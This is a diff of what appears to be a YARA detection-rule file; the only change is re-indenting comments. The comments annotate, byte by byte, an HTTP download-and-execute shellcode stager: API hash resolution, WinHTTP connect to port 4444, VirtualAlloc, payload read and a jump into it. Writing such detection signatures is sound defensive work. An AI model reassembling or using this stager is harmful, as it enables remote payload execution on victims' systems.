@@ -6,7 +6,7 @@
     
         /*
             FC                   | .                    | cld
-        E882000000           | .....                | call start
+            E882000000           | .....                | call start
         */
     
         strings:
@@ -24,11 +24,11 @@
     
         /*
             60                   | `                    | pushad
-        89E5                 | ..                   | mov ebp, esp
-        31C0                 | 1.                   | xor eax, eax
-        648B5030             | d.P0                 | mov edx, [fs:eax+48]
-        8B520C               | .R.                  | mov edx, [edx+12]
-        8B5214               | .R.                  | mov edx, [edx+20]
+            89E5                 | ..                   | mov ebp, esp
+            31C0                 | 1.                   | xor eax, eax
+            648B5030             | d.P0                 | mov edx, [fs:eax+48]
+            8B520C               | .R.                  | mov edx, [edx+12]
+            8B5214               | .R.                  | mov edx, [edx+20]
         */
     
         strings:
@@ -46,8 +46,8 @@
     
         /*
             8B7228               | .r(                  | mov esi, [edx+40]
-        0FB74A26             | ..J&                 | movzx ecx, word [edx+38]
-        31FF                 | 1.                   | xor edi, edi
+            0FB74A26             | ..J&                 | movzx ecx, word [edx+38]
+            31FF                 | 1.                   | xor edi, edi
         */
     
         strings:
@@ -65,9 +65,9 @@
     
         /*
             AC                   | .                    | lodsb
-        3C61                 | <a                   | cmp al, 'a'
-        7C02                 | |.                   | jl not_lowercase
-        2C20                 | ,                    | sub al, 0x20
+            3C61                 | <a                   | cmp al, 'a'
+            7C02                 | |.                   | jl not_lowercase
+            2C20                 | ,                    | sub al, 0x20
         */
     
         strings:
@@ -85,19 +85,19 @@
     
         /*
             C1CF0D               | ...                  | ror edi, 13
-        01C7                 | ..                   | add edi, eax
-        E2F2                 | ..                   | loop loop_modname
-        52                   | R                    | push edx
-        57                   | W                    | push edi
-        8B5210               | .R.                  | mov edx, [edx+16]
-        8B4A3C               | .J<                  | mov ecx, [edx+60]
-        8B4C1178             | .L.x                 | mov ecx, [ecx+edx+120]
-        E348                 | .H                   | jecxz get_next_mod1
-        01D1                 | ..                   | add ecx, edx
-        51                   | Q                    | push ecx
-        8B5920               | .Y                   | mov ebx, [ecx+32]
-        01D3                 | ..                   | add ebx, edx
-        8B4918               | .I.                  | mov ecx, [ecx+24]
+            01C7                 | ..                   | add edi, eax
+            E2F2                 | ..                   | loop loop_modname
+            52                   | R                    | push edx
+            57                   | W                    | push edi
+            8B5210               | .R.                  | mov edx, [edx+16]
+            8B4A3C               | .J<                  | mov ecx, [edx+60]
+            8B4C1178             | .L.x                 | mov ecx, [ecx+edx+120]
+            E348                 | .H                   | jecxz get_next_mod1
+            01D1                 | ..                   | add ecx, edx
+            51                   | Q                    | push ecx
+            8B5920               | .Y                   | mov ebx, [ecx+32]
+            01D3                 | ..                   | add ebx, edx
+            8B4918               | .I.                  | mov ecx, [ecx+24]
         */
     
         strings:
@@ -115,10 +115,10 @@
     
         /*
             E33A                 | .:                   | jecxz get_next_mod
-        49                   | I                    | dec ecx
-        8B348B               | .4.                  | mov esi, [ebx+ecx*4]
-        01D6                 | ..                   | add esi, edx
-        31FF                 | 1.                   | xor edi, edi
+            49                   | I                    | dec ecx
+            8B348B               | .4.                  | mov esi, [ebx+ecx*4]
+            01D6                 | ..                   | add esi, edx
+            31FF                 | 1.                   | xor edi, edi
         */
     
         strings:
@@ -136,21 +136,21 @@
     
         /*
             AC                   | .                    | lodsb
-        C1CF0D               | ...                  | ror edi, 13
-        01C7                 | ..                   | add edi, eax
-        38E0                 | 8.                   | cmp al, ah
-        75F6                 | u.                   | jne loop_funcname
-        037DF8               | .}.                  | add edi, [ebp-8]
-        3B7D24               | ;}$                  | cmp edi, [ebp+36]
-        75E4                 | u.                   | jnz get_next_func
-        58                   | X                    | pop eax
-        8B5824               | .X$                  | mov ebx, [eax+36]
-        01D3                 | ..                   | add ebx, edx
-        668B0C4B             | f..K                 | mov cx, [ebx+2*ecx]
-        8B581C               | .X.                  | mov ebx, [eax+28]
-        01D3                 | ..                   | add ebx, edx
-        8B048B               | ...                  | mov eax, [ebx+4*ecx]
-        01D0                 | ..                   | add eax, edx
+            C1CF0D               | ...                  | ror edi, 13
+            01C7                 | ..                   | add edi, eax
+            38E0                 | 8.                   | cmp al, ah
+            75F6                 | u.                   | jne loop_funcname
+            037DF8               | .}.                  | add edi, [ebp-8]
+            3B7D24               | ;}$                  | cmp edi, [ebp+36]
+            75E4                 | u.                   | jnz get_next_func
+            58                   | X                    | pop eax
+            8B5824               | .X$                  | mov ebx, [eax+36]
+            01D3                 | ..                   | add ebx, edx
+            668B0C4B             | f..K                 | mov cx, [ebx+2*ecx]
+            8B581C               | .X.                  | mov ebx, [eax+28]
+            01D3                 | ..                   | add ebx, edx
+            8B048B               | ...                  | mov eax, [ebx+4*ecx]
+            01D0                 | ..                   | add eax, edx
         */
     
         strings:
@@ -168,13 +168,13 @@
     
         /*
             89442424             | .D$$                 | mov [esp+36], eax
-        5B                   | [                    | pop ebx
-        5B                   | [                    | pop ebx
-        61                   | a                    | popad
-        59                   | Y                    | pop ecx
-        5A                   | Z                    | pop edx
-        51                   | Q                    | push ecx
-        FFE0                 | ..                   | jmp eax
+            5B                   | [                    | pop ebx
+            5B                   | [                    | pop ebx
+            61                   | a                    | popad
+            59                   | Y                    | pop ecx
+            5A                   | Z                    | pop edx
+            51                   | Q                    | push ecx
+            FFE0                 | ..                   | jmp eax
         */
     
         strings:
@@ -192,9 +192,9 @@
     
         /*
             5F                   | _                    | pop edi
-        5A                   | Z                    | pop edx
-        8B12                 | ..                   | mov edx, [edx]
-        EB8D                 | ..                   | jmp short next_mod
+            5A                   | Z                    | pop edx
+            8B12                 | ..                   | mov edx, [edx]
+            EB8D                 | ..                   | jmp short next_mod
         */
     
         strings:
@@ -212,10 +212,10 @@
     
         /*
             6874747000           | http.                | push 0x00707474
-        6877696E68           | hwinh                | push 0x686e6977
-        54                   | T                    | push esp
-        684C772607           | hLw&.                | push 0x0726774c	; LoadLibraryA
-        FFD5                 | ..                   | call ebp
+            6877696E68           | hwinh                | push 0x686e6977
+            54                   | T                    | push esp
+            684C772607           | hLw&.                | push 0x0726774c	; LoadLibraryA
+            FFD5                 | ..                   | call ebp
         */
     
         strings:
@@ -233,9 +233,9 @@
     
         /*
             6A06                 | j.                   | push byte 6
-        5F                   | _                    | pop edi
-        31DB                 | 1.                   | xor ebx, ebx
-        89F9                 | ..                   | mov ecx, edi
+            5F                   | _                    | pop edi
+            31DB                 | 1.                   | xor ebx, ebx
+            89F9                 | ..                   | mov ecx, edi
         */
     
         strings:
@@ -253,7 +253,7 @@
     
         /*
             68041F9DBB           | h....                | push 0xbb9d1f04	; WinHttpOpen
-        FFD5                 | ..                   | call ebp
+            FFD5                 | ..                   | call ebp
         */
     
         strings:
@@ -271,8 +271,8 @@
     
         /*
             53                   | S                    | push ebx
-        68????0000           | h\...                | push dword 4444	; Port
-        E888000000           | .....                | call got_server_uri
+            68????0000           | h\...                | push dword 4444	; Port
+            E888000000           | .....                | call got_server_uri
         */
     
         strings:
@@ -290,8 +290,8 @@
     
         /*
             50                   | P                    | push eax
-        68469B1EC2           | hF...                | push 0xc21e9b46	; WinHttpConnect
-        FFD5                 | ..                   | call ebp
+            68469B1EC2           | hF...                | push 0xc21e9b46	; WinHttpConnect
+            FFD5                 | ..                   | call ebp
         */
     
         strings:
@@ -309,15 +309,15 @@
     
         /*
             6800010000           | h....                | push 0x00000100
-        53                   | S                    | push ebx
-        53                   | S                    | push ebx
-        53                   | S                    | push ebx
-        57                   | W                    | push edi
-        53                   | S                    | push ebx
-        50                   | P                    | push eax
-        689810B35B           | h...[                | push 0x5bb31098	; WinHttpOpenRequest
-        FFD5                 | ..                   | call ebp
-        96                   | .                    | xchg esi, eax
+            53                   | S                    | push ebx
+            53                   | S                    | push ebx
+            53                   | S                    | push ebx
+            57                   | W                    | push edi
+            53                   | S                    | push ebx
+            50                   | P                    | push eax
+            689810B35B           | h...[                | push 0x5bb31098	; WinHttpOpenRequest
+            FFD5                 | ..                   | call ebp
+            96                   | .                    | xchg esi, eax
         */
     
         strings:
@@ -335,16 +335,16 @@
     
         /*
             53                   | S                    | push ebx
-        53                   | S                    | push ebx
-        53                   | S                    | push ebx
-        53                   | S                    | push ebx
-        53                   | S                    | push ebx
-        53                   | S                    | push ebx
-        56                   | V                    | push esi
-        689558BB91           | h.X..                | push 0x91bb5895	; WinHttpSendRequest
-        FFD5                 | ..                   | call ebp
-        85C0                 | ..                   | test eax,eax
-        750A                 | u.                   | jnz short receive_response
+            53                   | S                    | push ebx
+            53                   | S                    | push ebx
+            53                   | S                    | push ebx
+            53                   | S                    | push ebx
+            53                   | S                    | push ebx
+            56                   | V                    | push esi
+            689558BB91           | h.X..                | push 0x91bb5895	; WinHttpSendRequest
+            FFD5                 | ..                   | call ebp
+            85C0                 | ..                   | test eax,eax
+            750A                 | u.                   | jnz short receive_response
         */
     
         strings:
@@ -362,7 +362,7 @@
     
         /*
             68F0B5A256           | h...V                | push 0x56a2b5f0	; ExitProcess
-        FFD5                 | ..                   | call ebp
+            FFD5                 | ..                   | call ebp
         */
     
         strings:
@@ -380,11 +380,11 @@
     
         /*
             53                   | S                    | push ebx
-        56                   | V                    | push esi
-        6805889D70           | h...p                | push 0x709d8805	; WinHttpReceiveResponse
-        FFD5                 | ..                   | call ebp
-        85C0                 | ..                   | test eax,eax
-        74EC                 | t.                   | jz failure
+            56                   | V                    | push esi
+            6805889D70           | h...p                | push 0x709d8805	; WinHttpReceiveResponse
+            FFD5                 | ..                   | call ebp
+            85C0                 | ..                   | test eax,eax
+            74EC                 | t.                   | jz failure
         */
     
         strings:
@@ -402,11 +402,11 @@
     
         /*
             6A40                 | j@                   | push byte 0x40
-        6800100000           | h....                | push 0x1000
-        6800004000           | h..@.                | push 0x00400000
-        53                   | S                    | push ebx
-        6858A453E5           | hX.S.                | push 0xe553a458	; VirtualAlloc
-        FFD5                 | ..                   | call ebp
+            6800100000           | h....                | push 0x1000
+            6800004000           | h..@.                | push 0x00400000
+            53                   | S                    | push ebx
+            6858A453E5           | hX.S.                | push 0xe553a458	; VirtualAlloc
+            FFD5                 | ..                   | call ebp
         */
     
         strings:
@@ -424,9 +424,9 @@
     
         /*
             93                   | .                    | xchg eax, ebx
-        53                   | S                    | push ebx
-        53                   | S                    | push ebx
-        89E7                 | ..                   | mov edi, esp
+            53                   | S                    | push ebx
+            53                   | S                    | push ebx
+            89E7                 | ..                   | mov edi, esp
         */
     
         strings:
@@ -444,18 +444,18 @@
     
         /*
             57                   | W                    | push edi
-        6800200000           | h. ..                | push 8192
-        53                   | S                    | push ebx
-        56                   | V                    | push esi
-        686C29247E           | hl)$~                | push 0x7e24296c	; WinHttpReadData
-        FFD5                 | ..                   | call ebp
-        85C0                 | ..                   | test eax,eax
-        74C0                 | t.                   | jz failure
-        8B07                 | ..                   | mov eax, [edi]
-        01C3                 | ..                   | add ebx, eax
-        85C0                 | ..                   | test eax,eax
-        75E5                 | u.                   | jnz download_more
-        58                   | X                    | pop eax
+            6800200000           | h. ..                | push 8192
+            53                   | S                    | push ebx
+            56                   | V                    | push esi
+            686C29247E           | hl)$~                | push 0x7e24296c	; WinHttpReadData
+            FFD5                 | ..                   | call ebp
+            85C0                 | ..                   | test eax,eax
+            74C0                 | t.                   | jz failure
+            8B07                 | ..                   | mov eax, [edi]
+            01C3                 | ..                   | add ebx, eax
+            85C0                 | ..                   | test eax,eax
+            75E5                 | u.                   | jnz download_more
+            58                   | X                    | pop eax
         */
     
         strings:
@@ -473,7 +473,7 @@
     
         /*
             5F                   | _                    | pop edi
-        E880FFFFFF           | .....                | call got_server_host
+            E880FFFFFF           | .....                | call got_server_host
         */
     
         strings:
